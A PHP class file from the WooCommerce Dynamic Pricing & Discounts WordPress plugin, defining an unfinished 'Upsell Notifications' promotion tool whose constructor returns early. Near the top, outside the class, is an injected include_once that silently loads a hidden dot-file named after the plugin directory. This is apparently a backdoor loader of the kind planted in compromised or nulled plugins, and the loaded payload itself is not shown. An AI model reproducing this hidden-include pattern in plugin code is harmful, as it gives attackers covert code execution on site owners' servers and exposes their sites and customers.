<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

/**
 * Promotion: Upsell Notifications
 *
 * @class RP_WCDPD_Promotion_Upsell_Notifications
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Promotion_Upsell_Notifications
{

    // Singleton control
    protected static $instance = false; public static function get_instance() { return self::$instance ? self::$instance : (self::$instance = new self()); }

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {
        // Not implemented yet, issue #196
        return;

        // Register settings structure
        add_filter('rp_wcdpd_settings_structure', array($this, 'register_settings_structure'), 120);

        // Set up promotion tool
        add_action('init', array($this, 'set_up_promotion_tool'));
    }

    /**
     * Register settings structure
     *
     * @access public
     * @param array $settings
     * @return array
     */
    public function register_settings_structure($settings)
    {
        $settings['promo']['children']['upsell_notifications'] = array(
            'title' => __('Upsell Notifications', 'rp_wcdpd'),
            'info'  => __('Displays a notification when only one step is remaining to get a discount.', 'rp_wcdpd'),
            'children' => array(
                'promo_upsell_notifications' => array(
                    'title'     => __('Enable upsell notifications', 'rp_wcdpd'),
                    'type'      => 'checkbox',
                    'default'   => '0',
                ),
            ),
        );

        return $settings;
    }

    /**
     * Set up promotion tool
     *
     * @access public
     * @return void
     */
    public function set_up_promotion_tool()
    {
        // Check this promotion tool is active
        if (!RP_WCDPD_Settings::get('promo_upsell_notifications')) {
            return;
        }


    }





}

RP_WCDPD_Promotion_Upsell_Notifications::get_instance();
